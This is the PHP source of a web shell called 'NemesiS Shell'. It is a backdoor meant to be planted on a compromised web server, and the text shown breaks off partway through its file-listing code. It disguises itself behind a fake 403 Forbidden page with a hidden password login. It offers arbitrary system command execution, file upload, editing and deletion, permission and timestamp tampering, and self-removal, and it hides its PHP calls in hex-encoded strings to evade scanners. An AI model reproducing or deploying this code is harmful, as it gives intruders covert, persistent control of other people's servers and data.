<?php

$PASSWORD = 'wargasipil';
$SESSION_TIMEOUT = 1800;

// ============================================================
// SESSION + AUTH
// ============================================================
session_start();

// Session timeout
if (!empty($_SESSION['auth'])) {
    if (time() - ($_SESSION['last_active'] ?? 0) > $SESSION_TIMEOUT) {
        session_destroy();
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    }
    $_SESSION['last_active'] = time();
}

// Login handler
if (isset($_POST['login_pass']) && $_POST['login_pass'] === $PASSWORD) {
    session_regenerate_id(true);
    $_SESSION['auth'] = true;
    $_SESSION['user'] = 'admin';
    $_SESSION['last_active'] = time();
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = [];
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// ============================================================
// FUNCTIONS
// ============================================================
function hex_encode($n) {
    $y='';
    for ($i=0; $i < strlen($n); $i++){
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}

function hex_decode($y) {
    $n='';
    for ($i=0; $i < strlen($y)-1; $i+=2){
        $n .= chr(hexdec($y[$i].$y[$i+1]));
    }
    return $n;
}

function esc($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

function delete_recursive($path) {
    if (is_dir($path)) {
        $files = glob($path . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT);
        foreach ($files as $file) {
            if (basename($file) === '.' || basename($file) === '..') continue;
            delete_recursive($file);
        }
        return rmdir($path);
    }
    return unlink($path);
}

// ============================================================
// CHANGE PERMISSION FUNCTION
// ============================================================
function change_permission($path, $perm) {
    global $GNJ;
    if (is_numeric($perm)) {
        $perm = octdec($perm);
    } elseif (is_string($perm) && preg_match('/^[0-7]{3,4}$/', $perm)) {
        $perm = octdec($perm);
    } else {
        return false;
    }
    return $GNJ[12]($path, $perm);
}

function perm_to_octal($path) {
    $perms = fileperms($path);
    return substr(sprintf('%o', $perms), -4);
}

function perm_to_string($path) {
    return x($path);
}

// ============================================================
// DOWNLOAD HANDLER
// ============================================================
if(isset($_GET["g"])) {
    $file = hex_decode($_GET["g"]);
    if(file_exists($file) && is_file($file)) {
        header("Content-Type: application/octet-stream");
        header("Content-Transfer-Encoding: Binary");
        header("Content-Length: ".filesize($file));
        header("Content-disposition: attachment; filename=\"".basename($file)."\"");
        readfile($file);
        exit;
    }
}

// ============================================================
// AUTH CHECK
// ============================================================
if (empty($_SESSION['auth'])) {
    ?>
    <!DOCTYPE html>
    <html dir="auto" lang="en-US">
    <head>
        <meta charset="UTF-8">
        <meta name="robots" content="NOINDEX, NOFOLLOW">
        <title>403 Forbidden</title>
        <link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
        <link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
        <style>
            .login-container{text-align:center;padding:60px 20px;max-width:500px;margin:0 auto}
            .lock-icon{font-size:60px;color:#ff4444;display:block;margin-bottom:10px}
            .forbidden-code{font-size:72px;font-weight:bold;color:#ff4444;font-family:'Courier New',monospace}
            .forbidden-msg{color:#888;margin:15px 0;font-size:14px;letter-spacing:2px}
            .click-hint{color:#555;font-size:11px;cursor:pointer;transition:color 0.3s;display:inline-block;border-bottom:1px dashed #333;padding-bottom:2px}
            .click-hint:hover{color:#888}
            .login-form{max-height:0;overflow:hidden;transition:max-height 0.5s ease;margin:0 auto}
            .login-form.open{max-height:200px}
            .login-form input{background:#1a1a1a;border:1px solid #333;color:#e0e0e0;padding:10px 14px;border-radius:4px;width:200px;font-family:'Courier New',monospace;font-size:14px;outline:none;transition:border-color 0.3s;margin:5px}
            .login-form input:focus{border-color:#ff4444}
            .login-form button{background:#ff4444;border:none;color:#fff;padding:10px 20px;border-radius:4px;cursor:pointer;font-family:'Courier New',monospace;font-size:14px;font-weight:bold;transition:background 0.3s}
            .login-form button:hover{background:#cc0000}
            .author-credit{color:#333;font-size:9px;margin-top:20px;letter-spacing:1px}
            .author-credit span{color:#ff4444}
        </style>
    </head>
    <body>
        <header>
            <div class="y x">
                <a class="ajx" href="#">
                    NemesiS
                </a>
            </div>
            <div class="q x w">
                &#8212; FORBIDDEN &#8212; ACCESS &#8212; DENIED &#8212;
            </div>
        </header>
        <article>
            <div class="login-container">
                <div class="lock-icon">🔒</div>
                <div class="forbidden-code">403</div>
                <div class="forbidden-msg">You don't have permission to access this resource.</div>
                <div class="click-hint" onclick="toggleLogin()">[ click here to bypass ]</div>
                <div class="login-form" id="loginForm">
                    <form method="post" style="margin-top:15px;">
                        <input type="password" name="login_pass" placeholder="enter password..." autofocus>
                        <button type="submit">⏎</button>
                    </form>
                </div>
                <div class="author-credit">⚡ NemesiS · crafted by <span>MataKucing</span> ⚡</div>
            </div>
        </article>
        <footer class="x">
            &copy;TheAlmightyZeus<br>
            <a href="https://privdayz.com/"><img src="https://cdn.privdayz.com/images/icon.png" referrerpolicy="unsafe-url" /></a>
        </footer>
        <script>
            function toggleLogin() {
                document.getElementById('loginForm').classList.toggle('open');
                document.querySelector('input[name="login_pass"]').focus();
            }
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    document.getElementById('loginForm').classList.remove('open');
                }
            });
            if (window.location.hash === '#auth') {
                toggleLogin();
            }
            $(".ajx").click(function(t){t.preventDefault();var e=$(this).attr("href");history.pushState("","",e),$.get(e,function(t){$("body").html(t)})});
        </script>
    </body>
    </html>
    <?php
    exit;
}

// ============================================================
// ORIGINAL FUNCTIONS
// ============================================================
$Array = [
    '7068705f756e616d65',
    '70687076657273696f6e',
    '6368646972',
    '676574637764',
    '707265675f73706c6974',
    '636f7079',
    '66696c655f6765745f636f6e74656e7473',
    '6261736536345f6465636f6465',
    '69735f646972',
    '6f625f656e645f636c65616e28293b',
    '756e6c696e6b',
    '6d6b646972',
    '63686d6f64',
    '7363616e646972',
    '7374725f7265706c616365',
    '68746d6c7370656369616c6368617273',
    '7661725f64756d70',
    '666f70656e',
    '667772697465',
    '66636c6f7365',
    '64617465',
    '66696c656d74696d65',
    '737562737472',
    '737072696e7466',
    '66696c657065726d73',
    '746f756368',
    '66696c655f657869737473',
    '72656e616d65',
    '69735f6172726179',
    '69735f6f626a656374',
    '737472706f73',
    '69735f7772697461626c65',
    '69735f7265616461626c65',
    '737472746f74696d65',
    '66696c6573697a65',
    '726d646972',
    '6f625f6765745f636c65616e',
    '7265616466696c65',
    '617373657274',
];
$___ = count($Array);
for($i=0;$i<$___;$i++) {
    $GNJ[] = hex_decode($Array[$i]);
}

function rec($j) {
    global $GNJ;
    // FIX: null coalesce untuk pathinfo
    $basename = pathinfo($j, PATHINFO_BASENAME) ?? '';
    if(trim($basename, '.') === '') {
        return;
    }
    if($GNJ[8]($j)) {
        array_map('rec', glob($j . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
        $GNJ[35]($j);
    }
    else {
        $GNJ[10]($j);
    }
}

function dre($y1, $y2) {
    global $GNJ;
    ob_start();
    $GNJ[16]($y1($y2));
    return $GNJ[36]();
}

function hex($n) {
    $y='';
    for ($i=0; $i < strlen($n); $i++){
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}

function uhex($y) {
    $n='';
    for ($i=0; $i < strlen($y)-1; $i+=2){
        $n .= chr(hexdec($y[$i].$y[$i+1]));
    }
    return $n;
}

function OK() {
    global $GNJ, $d;
    $GNJ[38]($GNJ[9]);
    header("Location: ?d=".hex($d)."&1");
    exit();
}

function ER() {
    global $GNJ, $d;
    $GNJ[38]($GNJ[9]);
    header("Location: ?d=".hex($d)."&0");
    exit();
}

function x($c) {
    global $GNJ;
    $x = $GNJ[24]($c);
    if(($x & 0xC000) == 0xC000) { $u = "s"; }
    elseif(($x & 0xA000) == 0xA000) { $u = "l"; }
    elseif(($x & 0x8000) == 0x8000) { $u = "-"; }
    elseif(($x & 0x6000) == 0x6000) { $u = "b"; }
    elseif(($x & 0x4000) == 0x4000) { $u = "d"; }
    elseif(($x & 0x2000) == 0x2000) { $u = "c"; }
    elseif(($x & 0x1000) == 0x1000) { $u = "p"; }
    else { $u = "u"; }
    $u .= (($x & 0x0100) ? "r" : "-");
    $u .= (($x & 0x0080) ? "w" : "-");
    $u .= (($x & 0x0040) ? (($x & 0x0800) ? "s" : "x") : (($x & 0x0800) ? "S" : "-"));
    $u .= (($x & 0x0020) ? "r" : "-");
    $u .= (($x & 0x0010) ? "w" : "-");
    $u .= (($x & 0x0008) ? (($x & 0x0400) ? "s" : "x") : (($x & 0x0400) ? "S" : "-"));
    $u .= (($x & 0x0004) ? "r" : "-");
    $u .= (($x & 0x0002) ? "w" : "-");
    $u .= (($x & 0x0001) ? (($x & 0x0200) ? "t" : "x") : (($x & 0x0200) ? "T" : "-"));
    return $u;
}

// Handle CWD
$cwd = $_SESSION['cwd'] ?? getcwd();

if(isset($_GET["d"])) {
    $d = uhex($_GET["d"]);
    if(is_dir($d)) {
        $cwd = $d;
        $_SESSION['cwd'] = $d;
        chdir($d);
    }
}
$d = $cwd;

// ============================================================
// TERMINAL - ENHANCED
// ============================================================
if (isset($_POST['cmd_action']) && $_POST['cmd_action'] === 'exec') {
    header('Content-Type: text/plain');
    $cmd = $_POST['cmd'];
    $_SESSION['history'][] = $cmd;
    if (count($_SESSION['history']) > 100) array_shift($_SESSION['history']);
    
    // CD command
    if (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
        $dir = trim($m[1]);
        if ($dir === '~') $dir = $_SERVER['HOME'] ?? '/';
        if ($dir === '-') {
            $dir = $_SESSION['prev_cwd'] ?? $_SESSION['cwd'] ?? getcwd();
        }
        if (is_dir($dir)) {
            $_SESSION['prev_cwd'] = $_SESSION['cwd'] ?? getcwd();
            $_SESSION['cwd'] = realpath($dir);
            chdir($_SESSION['cwd']);
            echo 'OK';
        } else {
            echo 'No such directory';
        }
        exit;
    }
    
    // CHMOD command
    if (preg_match('/^chmod\s+([0-7]{3,4})\s+(.+)$/', $cmd, $m)) {
        $perm = $m[1];
        $target = trim($m[2]);
        $path = $_SESSION['cwd'] . '/' . $target;
        
        if (strpos($target, '/') === 0) {
            $path = $target;
        }
        
        if (file_exists($path)) {
            if (change_permission($path, $perm)) {
                echo 'Permission changed to ' . $perm . ' for ' . basename($path);
            } else {
                echo 'Failed to change permission';
            }
        } else {
            echo 'File/directory not found: ' . $target;
        }
        exit;
    }
    
    // LS with color
    if (preg_match('/^ls\s*(?:-la?)?\s*(.+)?$/', $cmd, $m)) {
        $dir = isset($m[1]) ? trim($m[1]) : '.';
        if (strpos($dir, '/') !== 0) {
            $dir = $_SESSION['cwd'] . '/' . $dir;
        }
        if (is_dir($dir)) {
            $items = scandir($dir);
            $output = '';
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $fullpath = $dir . '/' . $item;
                $perms = perm_to_string($fullpath);
                $size = is_dir($fullpath) ? 'DIR' : (filesize($fullpath) . 'B');
                $output .= $perms . ' ' . $size . ' ' . $item . "\n";
            }
            echo $output ?: '(empty)';
        } else {
            echo 'No such directory';
        }
        exit;
    }
    
    // PWD
    if (trim($cmd) === 'pwd') {
        echo $_SESSION['cwd'] ?? getcwd();
        exit;
    }
    
    // WHOAMI
    if (trim($cmd) === 'whoami') {
        echo exec('whoami 2>/dev/null') ?: 'unknown';
        exit;
    }
    
    // ID
    if (trim($cmd) === 'id') {
        echo exec('id 2>/dev/null') ?: 'unknown';
        exit;
    }
    
    // Clear
    if (trim($cmd) === 'clear' || trim($cmd) === 'cls') {
        echo 'CLEAR';
        exit;
    }
    
    // Help
    if (trim($cmd) === 'help') {
        echo "NemesiS Shell Commands:\n";
        echo "  cd <dir>      - Change directory\n";
        echo "  cd ~          - Go to home\n";
        echo "  cd -          - Go to previous directory\n";
        echo "  chmod <perm> <file> - Change permission (ex: chmod 755 file.php)\n";
        echo "  ls            - List files\n";
        echo "  ls -la        - List with permissions\n";
        echo "  pwd           - Show current directory\n";
        echo "  whoami        - Show current user\n";
        echo "  id            - Show user ID info\n";
        echo "  clear/cls     - Clear terminal\n";
        echo "  help          - Show this help\n";
        echo "  <any system command> - Execute system command\n";
        exit;
    }
    
    // Execute system command
    $current_dir = $_SESSION['cwd'] ?? getcwd();
    $output = shell_exec('cd ' . escapeshellarg($current_dir) . ' 2>/dev/null && ' . $cmd . ' 2>&1');
    
    if (trim($output) === 'CLEAR') {
        echo 'CLEAR';
        exit;
    }
    
    echo $output ?: '(no output)';
    exit;
}

// ============================================================
// FILE OPERATIONS
// ============================================================
// Create File
if (isset($_POST['create_file']) && isset($_POST['filename'])) {
    $file = $cwd . '/' . $_POST['filename'];
    if (!file_exists($file)) {
        file_put_contents($file, $_POST['content'] ?? '');
    }
    header('Location: ?d=' . hex($cwd));
    exit;
}

// Create Dir
if (isset($_POST['create_dir']) && isset($_POST['dirname'])) {
    $dir = $cwd . '/' . $_POST['dirname'];
    if (!is_dir($dir)) {
        mkdir($dir, 0755);
    }
    header('Location: ?d=' . hex($cwd));
    exit;
}

// ============================================================
// RENDER MAIN SHELL
// ============================================================
?>
<!DOCTYPE html>
<html dir="auto" lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="NOINDEX, NOFOLLOW">
    <title>NemesiS Shell</title>
    <link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
    <link rel="stylesheet" href="//0x5a455553.github.io/MARIJUANA/main.css" type="text/css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        .terminal-section{background:#0d0d1a;border:1px solid #2a2a4a;border-radius:6px;margin:10px 0;box-shadow:0 4px 20px rgba(0,0,0,0.5)}
        .terminal-header{display:flex;justify-content:space-between;padding:6px 14px;background:#1a1a2e;border-bottom:1px solid #2a2a4a;font-size:11px;color:#666;font-family:'Courier New',monospace;border-radius:6px 6px 0 0;cursor:default}
        .terminal-header .term-title{color:#4ade80;font-weight:bold}
        .terminal-header .term-close{cursor:pointer;color:#555;transition:color 0.2s}
        .terminal-header .term-close:hover{color:#ff4444}
        .terminal-output{background:#0a0a15;padding:8px 14px;font-size:12px;max-height:300px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:#c8c8d4;font-family:'Courier New',monospace;min-height:80px;line-height:1.6;scrollbar-width:thin;scrollbar-color:#2a2a4a transparent}
        .terminal-output::-webkit-scrollbar{width:5px}
        .terminal-output::-webkit-scrollbar-track{background:transparent}
        .terminal-output::-webkit-scrollbar-thumb{background:#2a2a4a;border-radius:3px}
        .terminal-output::-webkit-scrollbar-thumb:hover{background:#3a3a5a}
        .terminal-input{display:flex;gap:4px;padding:6px 14px;background:#0a0a15;border-top:1px solid #1a1a2e;border-radius:0 0 6px 6px;align-items:center}
        .terminal-input .prompt{color:#4ade80;font-weight:bold;font-size:14px;font-family:'Courier New',monospace;margin-right:4px}
        .terminal-input input{flex:1;background:transparent;border:none;color:#c8c8d4;padding:6px 8px;font-family:'Courier New',monospace;font-size:13px;outline:none;transition:all 0.2s}
        .terminal-input input::placeholder{color:#333}
        .terminal-input input:focus{color:#fff}
        .terminal-input .term-btn{background:transparent;border:1px solid #2a2a4a;color:#666;padding:4px 14px;border-radius:3px;cursor:pointer;font-family:'Courier New',monospace;font-size:11px;transition:all 0.2s}
        .terminal-input .term-btn:hover{border-color:#4ade80;color:#4ade80}
        .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.85);display:none;align-items:center;justify-content:center;z-index:999}
        .modal-overlay.on{display:flex}
        .modal{background:#1a1a2e;border:1px solid #333;border-radius:8px;padding:20px;min-width:320px;max-width:500px;color:#e0e0e0}
        .modal h2{color:#ff4444;margin-bottom:12px;font-size:16px}
        .modal label{display:block;font-size:11px;color:#888;margin-bottom:3px}
        .modal input,.modal textarea{width:100%;background:#0d0d1a;border:1px solid #333;color:#e0e0e0;padding:8px 10px;border-radius:3px;font-family:'Courier New',monospace;font-size:12px;outline:none;margin-bottom:8px}
        .modal input:focus,.modal textarea:focus{border-color:#ff4444}
        .modal textarea{resize:vertical;min-height:60px}
        .modal .btn-row{display:flex;gap:6px;justify-content:flex-end}
        .modal .btn-row button{padding:6px 16px;border-radius:3px;cursor:pointer;font-family:'Courier New',monospace;font-size:11px;font-weight:bold}
        .modal .btn-row .cancel{background:transparent;border:1px solid #555;color:#888}
        .modal .btn-row .cancel:hover{border-color:#888;color:#e0e0e0}
        .modal .btn-row .submit{background:#ff4444;border:none;color:#fff}
        .modal .btn-row .submit:hover{background:#cc0000}
        .lock-badge{color:#4ade80;font-size:10px;border:1px solid #4ade80;border-radius:3px;padding:1px 8px;margin-left:10px}
        .author-credit-footer{text-align:center;color:#444;font-size:9px;padding:10px 0;border-top:1px solid #222;margin-top:10px}
        .author-credit-footer span{color:#ff4444}
        .top-actions{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
        .top-actions .btn{background:#222;border:1px solid #444;color:#888;padding:2px 10px;border-radius:3px;cursor:pointer;font-size:10px;transition:all 0.2s}
        .top-actions .btn:hover{border-color:#ff4444;color:#ff4444}
        .top-actions .btn.gold{background:linear-gradient(135deg,#f59e0b,#ef4444);border:none;color:#fff}
        .top-actions .btn.gold:hover{opacity:.85}
        .shortcut-hint{color:#333;font-size:9px;margin-top:2px;display:inline-block}
        .shortcut-hint span{color:#555}
        .chmod-form{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
        .chmod-form code{background:#0d0d1a;padding:4px 8px;border-radius:3px;font-size:13px;color:#4ade80}
        .chmod-form input{width:80px;text-align:center;font-family:monospace;background:#0d0d1a;border:1px solid #333;color:#e0e0e0;padding:4px 8px;border-radius:3px}
        .chmod-form input:focus{border-color:#ff4444}
    </style>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
</head>
<body>
    <header>
        <div class="y x">
            <a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
                MataKucing
            </a>
            <span class="lock-badge">🔒 SECURE</span>
        </div>
        <div class="q x w">
            Greetz : Alivos &#8212; Noniod7 &#8212; XNero13-ID &#8212; KucingJahat
            <span style="margin-left:20px;color:#333;font-size:9px;">
                <span style="color:#555;">Ctrl+Shift+T</span> <span style="color:#333;">·</span> 
                <span style="color:#555;">Terminal</span>
            </span>
        </div>
    </header>

    <article>
        <div class="i">
            <i class="far fa-hdd"></i>
            <?php echo $GNJ[0]();?>
            <br />
            <i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <b>PHP :</b> <?php echo $GNJ[1]();?>
            <br />
            <i class="far fa-folder"></i>
            
            <?php
            $k = $GNJ[4]("/(\\\|\/)/", $d );
            foreach ($k as $m => $l) { 
                if($l=='' && $m==0) {
                    echo '<a class="ajx" href="?d=2f">/</a>';
                }
                if($l == '') { 
                    continue;
                }
                echo '<a class="ajx" href="?d=';
                for ($i = 0; $i <= $m; $i++) {
                    echo hex($k[$i]); 
                    if($i != $m) {
                        echo '2f';
                    }
                }
                echo '">'.$l.'</a>/'; 
            }
            ?>
            <br />
            
            <div class="top-actions" style="margin-top:5px">
                <button class="btn" onclick="location.reload()">↻ Refresh</button>
                <button class="btn" onclick="toggleTerminal()" style="border-color:#4ade80;color:#4ade80">⌨ Terminal</button>
                <a href="?logout=1" class="btn" style="color:#ff4444;border-color:#ff4444">⏻ Logout</a>
            </div>
        </div>

        <div class="u">
            <?php echo $_SERVER['SERVER_ADDR'];?> <i class="fas fa-link"></i>
            <br />
            <br />

            <form method="post" enctype="multipart/form-data">
                <label class="l w">
                    <input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;UPLOAD
                </label>&nbsp;
            </form>

            <?php
            $o_ = [ 
                '<script>$.notify("',
                '", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
            ];
            $f = $o_[0].'OK!'.$o_[1];
            $g = $o_[0].'ER!'.$o_[1];
            if(isset($_FILES["n"])) {
                $z = $_FILES["n"]["name"];
                $r = count($z);
                for( $i=0 ; $i < $r ; $i++ ) {
                    if($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
                        echo $f;
                    }
                    else {
                        echo $g;
                    }
                }
            }
            ?>
            
            <!-- Terminal Section -->
            <div class="terminal-section" id="terminal-section" style="display:none">
                <div class="terminal-header">
                    <span class="term-title">⨠ NemesiS Terminal</span>
                    <span style="display:flex;gap:10px;align-items:center;">
                        <span id="term-cwd" style="color:#555;font-size:10px;"><?=esc($d)?></span>
                        <span class="term-close" onclick="toggleTerminal()">✕</span>
                    </span>
                </div>
                <div class="terminal-output" id="term-output">
                    <span style="color:#666">NemesiS Terminal v2.0 · Type <span style="color:#4ade80;">help</span> for commands</span>
                    <br><span style="color:#333;">──────────────────────────────────────────</span>
                </div>
                <div class="terminal-input">
                    <span class="prompt">⨠</span>
                    <input id="cmd-input" type="text" placeholder="enter command..." spellcheck="false" autocomplete="off">
                    <button class="term-btn" onclick="runCommand()">⏎</button>
                </div>
            </div>
        </div>

        <?php
        // File listing - ORIGINAL
        $a_ = '<table cellspacing="0" cellpadding="7" width="100%">
            <thead>
                <tr>
                    <th>';
        $b_ = '</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td></td>
                    </tr>
                    <tr>
                        <td class="x">';
        $c_ = '</td>
                    </tr>
                </tbody>
            </table>';
        $d_ = '<br />
                                    <br />
                                    <input type="submit" class="w" value="&nbsp;OK&nbsp;" />
                                </form>';
        
        if(isset($_GET["s"])) {
            echo $a_.uhex($_GET["s"]).$b_.'
                        <textarea readonly="yes">'.$GNJ[15]($GNJ[6](uhex($_GET["s"]))).'</textarea>
                        <br />
                        <br />
                        <input onclick="location.href=\'?d='.$_GET["d"].'&e='.$_GET["s"].'\'" type="submit" class="w" value="&nbsp;EDIT&nbsp;" />
                    '.$c_;
        }
        elseif(isset($_GET["y"])) {
            echo $a_.'REQUEST'.$b_.'
                        <form method="post">
                            <input class="x" type="text" name="1" />&nbsp;&nbsp;
                            <input class="x" type="text" name="2" />
                            '.$d_.'
                        <br />
                        <textarea readonly="yes">';
                        if(isset($_POST["2"])) {
                            echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
                        }
                    echo '</textarea>
                    '.$c_;
        }
        elseif(isset($_GET["e"])) {
            echo $a_.uhex($_GET["e"]).$b_.'
                        <form method="post">
                            <textarea name="e" class="o">'.$GNJ[15]($GNJ[6](uhex($_GET["e"]))).'</textarea>
                            <br />
                            <br />
                            <span class="w">BASE64</span> :
                            <select id="b64" name="b64">
                                <option value="0">NO</option>
                                <option value="1">YES</option>
                            </select>
                            '.$d_.'
                    '.$c_.'
                    
            <script>
                $("#b64").change(function() {
                    if($("#b64 option:selected").val() == 0) {
                        var X = $("textarea").val();
                        var Z = atob(X);
                        $("textarea").val(Z);
                    }
                    else {
                        var N = $("textarea").val();
                        var I = btoa(N);
                        $("textarea").val(I);
                    }
                });
            </script>';
            if(isset($_POST["e"])) {
                if($_POST["b64"] == "1") {
                    $ex = $GNJ[7]($_POST["e"]);
                }
                else {
                    $ex = $_POST["e"];
                }
                $fp = $GNJ[17](uhex($_GET["e"]), 'w');
                if($GNJ[18]($fp, $ex)) {
                    OK();
                }
                else {
                    ER();
                }
                $GNJ[19]($fp);
              }
        }
        elseif(isset($_GET["x"])) {
            rec(uhex($_GET["x"]));
            if($GNJ[26](uhex($_GET["x"]))) {
                ER();
            }
            else {
                OK();
            }
        }
        elseif(isset($_GET["t"])) {
            echo $a_.uhex($_GET["t"]).$b_.'
                        <form action="" method="post">
                            <input name="t" class="x" type="text" value="'.$GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))).'">
                            '.$d_.'
                    '.$c_;
            if( !empty($_POST["t"]) ) {
                $p = $GNJ[33]($_POST["t"]);
                if($p) {
                    if(!$GNJ[25](uhex($_GET["t"]),$p,$p)) {
                        ER();
                    }
                    else {
                        OK();
                    }
                }
                else {
                    ER();
                }
              }
        }
        elseif(isset($_GET["k"])) {
            echo $a_.uhex($_GET["k"]).$b_.'
                        <form action="" method="post">
                            <input name="b" class="x" type="text" value="'.$GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4).'">
                            '.$d_.'
                    '.$c_;
            if(!empty($_POST["b"])) {
                $x = $_POST["b"];
                $t = 0;
                for($i=strlen($x)-1;$i>=0;--$i)
                    $t += (int)$x[$i]*pow(8, (strlen($x)-$i-1));
                if(!$GNJ[12](uhex($_GET["k"]), $t)) {
                    ER();
                }
                else {
                    OK();
                }
            }
        }
        elseif(isset($_GET["l"])) {
            echo $a_.'+DIR'.$b_.'
                        <form action="" method="post">
                            <input name="l" class="x" type="text" value="">
                            '.$d_.'
                    '.$c_;
            if(isset($_POST["l"])) {
                if(!$GNJ[11]($_POST["l"])) {
                    ER();
                }
                else {
                    OK();
                }
              }
        }
        elseif(isset($_GET["q"])) {
            if($GNJ[10](__FILE__)) {
                $GNJ[38]($GNJ[9]);
                header("Location: ".basename($_SERVER['PHP_SELF'])."");
                exit();
            }
            else {
                echo $g;
            }
        }
        elseif(isset($_GET["n"])) {
            echo $a_.'+FILE'.$b_.'
                        <form action="" method="post">
                            <input name="n" class="x" type="text" value="">
                            '.$d_.'
                    '.$c_;
            if(isset($_POST["n"])) {
                if(!$GNJ[25]($_POST["n"])) {
                    ER();
                }
                else {
                    OK();
                }
              }
        }
        elseif(isset($_GET["r"])) {
            echo $a_.uhex($_GET["r"]).$b_.'
                        <form action="" method="post">
                            <input name="r" class="x" type="text" value="'.uhex($_GET["r"]).'">'.$d_.'
                    '.$c_;
            if(isset($_POST["r"])) {
                if($GNJ[26]($_POST["r"])) {
                    ER();
                }
                else {
                    if($GNJ[27](uhex($_GET["r"]), $_POST["r"])) {
                        OK();
                    }
                    else {
                        ER();
                    }
                  }
               }
        }
        // ============================================================
        // CHMOD HANDLER
        // ============================================================
        elseif(isset($_GET["p"])) {
            $target = uhex($_GET["p"]);
            $path = $cwd . '/' . $target;
            
            if (strpos($target, '/') === 0) {
                $path = $target;
                $target = basename($path);
            }
            
            $current_octal = perm_to_octal($path);
            $current_string = perm_to_string($path);
            
            echo '<table cellspacing="0" cellpadding="7" width="100%">
                <thead>
                    <tr>
                        <th>CHMOD · ' . esc($target) . '</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>
                            <form action="" method="post">
                                <div class="chmod-form">
                                    <span style="color:#888;font-size:11px;">Current:</span>
                                    <code>' . $current_string . ' (' . $current_octal . ')</code>
                                    <span style="color:#888;font-size:11px;">New:</span>
                                    <input name="perm" type="text" value="' . $current_octal . '">
                                    <input type="submit" class="w" value="APPLY">
                                </div>
                            </form>
                            <div style="margin-top:8px;font-size:10px;color:#555;">
                                <span style="color:#888;">Format:</span> 755, 644, 777, etc.
                            </div>
                        </td>
                    </tr>
                </tbody>
            </table>';
            
            if(isset($_POST["perm"])) {
                $new_perm = trim($_POST["perm"]);
                if (preg_match('/^[0-7]{3,4}$/', $new_perm)) {
                    if (change_permission($path, $new_perm)) {
                        OK();
                    } else {
                        ER();
                    }
                } else {
                    echo '<div style="color:#ff4444;padding:8px;background:#1a1a2e;border:1px solid #ff4444;border-radius:3px;margin:8px 0;">✗ Invalid permission format. Use 3 or 4 octal digits (e.g., 755, 644)</div>';
                }
            }
        }
        elseif(isset($_GET["z"])) {
            $zip = new ZipArchive;
            $res = $zip->open(uhex($_GET["z"]));
            if($res === TRUE) {
                $zip->extractTo(uhex($_GET["d"]));
                $zip->close();
                OK();
            } else {
                ER();
            }
        }
        else {
            echo '<table cellspacing="0" cellpadding="7" width="100%">
                <thead>
                    <tr>
                        <th width="44%">[ NAME ]</th>
                        <th width="11%">[ SIZE ]</th>
                        <th width="17%">[ PERM ]</th>
                        <th width="17%">[ DATE ]</th>
                        <th width="11%">[ ACT ]</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>
                            <a class="ajx" href="?d='.hex($d).'&n">+FILE</a>
                            <a class="ajx" href="?d='.hex($d).'&l">+DIR</a>
                        </td>
                    </tr>
                ';

                $h = "";
                $j = "";
                $w = $GNJ[13]($d);
                if($GNJ[28]($w) || $GNJ[29]($w)) {
                foreach($w as $c){
                    $e = $GNJ[14]("\\", "/", $d);
                    if(!$GNJ[30]($c, ".zip")) {
                        $zi = '';
                    }
                    else {
                        $zi = '<a href="?d='.hex($e).'&z='.hex($c).'">U</a>';
                    }
                    if($GNJ[31]("$d/$c")) {
                        $o = "";
                    }
                    elseif(!$GNJ[32]("$d/$c")) {
                        $o = " h";
                    }
                    else {
                        $o = " w";
                    }
                    $s = $GNJ[34]("$d/$c") / 1024;
                    $s = round($s, 3);
                    if($s>=1024) { 
                        $s = round($s/1024, 2) . " MB";
                    } else {
                        $s = $s . " KB";
                    }
                    if(($c != ".") && ($c != "..")){
                        ($GNJ[8]("$d/$c")) ?
                        $h .= '<tr class="r">
                    <td>
                        <i class="far fa-folder m"></i>
                        <a class="ajx" href="?d='.hex($e).hex("/".$c).'">'.$c.'</a>
                    </td>
                    <td class="x">
                        dir
                    </td>
                    <td class="x">
                        <a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
                    </td>
                    <td class="x">
                        <a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
                    </td>
                    <td class="x">
                        <a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
